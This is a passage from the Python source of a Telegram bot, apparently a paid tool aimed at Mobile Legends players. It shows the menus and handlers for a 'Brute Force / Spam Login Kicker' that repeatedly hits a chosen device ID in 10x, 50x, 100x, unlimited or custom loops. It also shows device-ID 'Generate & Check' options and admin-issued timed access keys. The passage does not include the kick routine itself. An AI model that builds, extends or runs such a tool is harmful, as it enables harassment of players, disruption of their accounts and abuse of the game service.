                active_devices = key_manager.get_user_devices(user_id)
                lifetime_devices = key_manager.get_lifetime_devices(user_id)
                active_count = self._bf_user_active_count(user_id)

                if not active_devices:
                    active_list = "  No active devices."
                else:
                    active_list = "\n".join(
                        f"  {i}. {d[:60]}..." if len(d) > 60 else f"  {i}. {d}"
                        for i, d in enumerate(active_devices, 1)
                    )

                await query.edit_message_text(
                    f"📱 My Bruteforce Devices\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Concurrent Limit: {len(active_devices)}/{max_devices}\n"
                    f"Remaining Slots: {max(0, max_devices - len(active_devices))}\n"
                    f"⚡ Active Kickers: {active_count}\n\n"
                    f"Active Devices:\n{active_list}\n\n"
                    f"📜 Lifetime History: {len(lifetime_devices)} device(s)",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("◀ Back", callback_data="back_main")]]
                    )
                )
            elif data == "admin_panel":
                await self.admin_panel(update, context)
            elif data == "admin_genkey":
                await self.admin_genkey_panel(update, context)
            elif data == "admin_listkeys":
                await self.admin_listkeys_panel(update, context)
            elif data == "admin_listusers":
                await self.admin_listusers_panel(update, context)
            elif data == "admin_devlimits":
                await self.admin_devlimits_panel(update, context)
            elif data == "bf_help":
                await query.answer()
                await query.edit_message_text(
                    "⚡ Brute Force / Spam Login Kicker\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "Usage: /bf <device_id>\n\n"
                    "The bot will verify the device ID, then show you "
                    "mode options (10x, 50x, 100x, unlimited, custom).\n\n"
                    "Commands:\n"
                    "• /bfstatus — Show all your active kickers\n"
                    "• /stop_bf — Stop ALL your kickers\n"
                    "• /mydevices — Show your device limit\n\n"
                    "📱 You can run MULTIPLE kickers at once up to your "
                    "concurrent device limit.\n"
                    "Stopping a kicker FREES UP a slot.\n"
                    "Contact admin to increase your limit.",
                    reply_markup=InlineKeyboardMarkup(
                        [[InlineKeyboardButton("◀ Back", callback_data="back_main")]]
                    )
                )
            elif data.startswith("bf_stp|"):
                dev_short = data.split("|", 1)[1]
                dev_map = context.user_data.get('bf_device_map', {})
                device_id = dev_map.get(dev_short)
                if not device_id:
                    await query.answer("❌ Device not found. Try /stop_bf.", show_alert=True)
                    return
                key = (user_id, device_id)
                if key in self.bf_cancel_flags:
                    self.bf_cancel_flags[key] = True
                    await query.answer("🛑 Stopping...", show_alert=False)
                else:
                    await query.answer("ℹ️ No active kicker for this device.", show_alert=False)
            elif data.startswith("bf_s|"):
                dev_short = data.split("|", 1)[1]
                dev_map = context.user_data.get('bf_device_map', {})
                device_id = dev_map.get(dev_short)
                if not device_id:
                    await query.answer("❌ Device not found.", show_alert=True)
                    return
                await self.bf_start_kick(update, context, total_loops=1, delay_sec=0.0, device_id=device_id)
            elif data.startswith("bf_10|"):
                dev_short = data.split("|", 1)[1]
                dev_map = context.user_data.get('bf_device_map', {})
                device_id = dev_map.get(dev_short)
                if not device_id:
                    await query.answer("❌ Device not found.", show_alert=True)
                    return
                await self.bf_start_kick(update, context, total_loops=10, delay_sec=2.0, device_id=device_id)
            elif data.startswith("bf_50|"):
                dev_short = data.split("|", 1)[1]
                dev_map = context.user_data.get('bf_device_map', {})
                device_id = dev_map.get(dev_short)
                if not device_id:
                    await query.answer("❌ Device not found.", show_alert=True)
                    return
                await self.bf_start_kick(update, context, total_loops=50, delay_sec=1.0, device_id=device_id)
            elif data.startswith("bf_100|"):
                dev_short = data.split("|", 1)[1]
                dev_map = context.user_data.get('bf_device_map', {})
                device_id = dev_map.get(dev_short)
                if not device_id:
                    await query.answer("❌ Device not found.", show_alert=True)
                    return
                await self.bf_start_kick(update, context, total_loops=100, delay_sec=0.5, device_id=device_id)
            elif data.startswith("bf_inf|"):
                dev_short = data.split("|", 1)[1]
                dev_map = context.user_data.get('bf_device_map', {})
                device_id = dev_map.get(dev_short)
                if not device_id:
                    await query.answer("❌ Device not found.", show_alert=True)
                    return
                await self.bf_start_kick(update, context, total_loops=0, delay_sec=0.2, device_id=device_id)
            elif data.startswith("bf_cus|"):
                dev_short = data.split("|", 1)[1]
                dev_map = context.user_data.get('bf_device_map', {})
                device_id = dev_map.get(dev_short)
                if not device_id:
                    await query.answer("❌ Device not found.", show_alert=True)
                    return
                if self._bf_is_active(user_id, device_id):
                    await query.answer("⚠️ Kicker already running! Use /stop_bf.", show_alert=True)
                    return
                await query.answer()
                context.user_data['bf_custom'] = True
                context.user_data['bf_custom_device'] = device_id
                await query.edit_message_text(
                    "🛠️ Custom Mode\n"
                    "Send: <loops> <delay_seconds>\n"
                    "Example: 200 1.5\n"
                    "Use 0 for unlimited loops."
                )
            elif data == "back_main":
                await query.answer()
                has_access = self._check_access(user_id)
                is_admin = self._is_admin(user_id)
                expiry = key_manager.get_expiry(user_id)
                if is_admin:
                    status_line = "Role: Admin"
                elif has_access:
                    status_line = f"Access until: {expiry}"
                else:
                    status_line = "No active access"
                keyboard = []
                if has_access or is_admin:
                    keyboard.append([InlineKeyboardButton("📁 Check from File", callback_data="check_file")])
                    keyboard.append([InlineKeyboardButton("🎲 Generate & Check", callback_data="generate")])
                    keyboard.append([InlineKeyboardButton("⚡ BruteForce", callback_data="bf_help")])
                    keyboard.append([InlineKeyboardButton("📱 My Devices", callback_data="my_devices")])
                if is_admin:
                    keyboard.append([InlineKeyboardButton("🔑 Admin Panel", callback_data="admin_panel")])
                keyboard.append([InlineKeyboardButton("📋 My Status", callback_data="my_status")])
                await query.edit_message_text(
                    f"MLBB Device ID Validator Bot\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{status_line}",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            elif data.startswith("genkey_"):
                if not self._is_admin(user_id):
                    await query.answer("❌", show_alert=True)
                    return
                duration_map = {
                    "genkey_1h": ("1h", "1 hour"),
                    "genkey_6h": ("6h", "6 hours"),
                    "genkey_12h": ("12h", "12 hours"),
                    "genkey_1d": ("1d", "1 day"),
                    "genkey_3d": ("3d", "3 days"),
                    "genkey_7d": ("7d", "7 days"),
                    "genkey_14d": ("14d", "14 days"),
                    "genkey_1m": ("1m", "1 month"),
                    "genkey_3m": ("3m", "3 months"),
                    "genkey_6m": ("6m", "6 months"),
                    "genkey_1y": ("1y", "1 year"),
                }
                if data not in duration_map:
                    await query.answer("Unknown.", show_alert=True)
                    return
                dur_str, dur_label = duration_map[data]
                seconds, label = parse_duration(dur_str)
                if seconds is None:
                    await query.answer("Error.", show_alert=True)
                    return
                key = key_manager.generate_key(seconds, label, user_id)
                await query.answer()
                keyboard = [
                    [InlineKeyboardButton("🔑 Generate Another", callback_data="admin_genkey")],
                    [InlineKeyboardButton("◀ Admin Panel", callback_data="admin_panel")]
                ]
                await query.edit_message_text(
                    f"✅ Key Generated!\n\nKey: {key}\nDuration: {label}\n\nRedeem: /redeem {key}",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
        except BadRequest as e:
            logger.error(f"button_callback BadRequest: {e}")
            try:
                await query.answer(f"⚠️ {e.message[:180]}", show_alert=True)
            except Exception:
                pass
        except Exception as e:
            logger.error(f"button_callback error: {e}")
            try:
                await query.answer("⚠️ An error occurred.", show_alert=True)
            except Exception:
                pass


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Update {update} caused error {context.error}")
    try:
        if isinstance(update, Update) and update.effective_message:
            err_text = str(context.error)
            if len(err_text) > 300:
                err_text = err_text[:300] + "..."
            await update.effective_message.reply_text(
                f"⚠️ An error occurred:\n{err_text}"
            )
    except Exception:
        pass


def main():
    bot = MLBBBot()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("help", bot.help))
    application.add_handler(CommandHandler("redeem", bot.redeem_cmd))
    application.add_handler(CommandHandler("genkey", bot.genkey_cmd))
    application.add_handler(CommandHandler("listkeys", bot.listkeys_cmd))
    application.add_handler(CommandHandler("listusers", bot.listusers_cmd))
    application.add_handler(CommandHandler("revoke", bot.revoke_cmd))
    application.add_handler(CommandHandler("delkey", bot.delkey_cmd))
    application.add_handler(CommandHandler("bf", bot.bf_cmd))
    application.add_handler(CommandHandler("bfstatus", bot.bfstatus_cmd))
    application.add_handler(CommandHandler("stop_bf", bot.stop_bf_cmd))
    application.add_handler(CommandHandler("mydevices", bot.mydevices_cmd))
    # Admin device limit commands
    application.add_handler(CommandHandler("setdevlimit", bot.setdevlimit_cmd))
    application.add_handler(CommandHandler("adddevlimit", bot.adddevlimit_cmd))
    application.add_handler(CommandHandler("checkdevlimit", bot.checkdevlimit_cmd))
    application.add_handler(CommandHandler("resetdevlimit", bot.resetdevlimit_cmd))
    application.add_handler(CommandHandler("listdevlimits", bot.listdevlimits_cmd))
    application.add_handler(CommandHandler("activekickers", bot.activekickers_cmd))
    application.add_handler(CallbackQueryHandler(bot.button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_message))
    application.add_error_handler(error_handler)
    print("MLBB Bot started!")
    print("Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
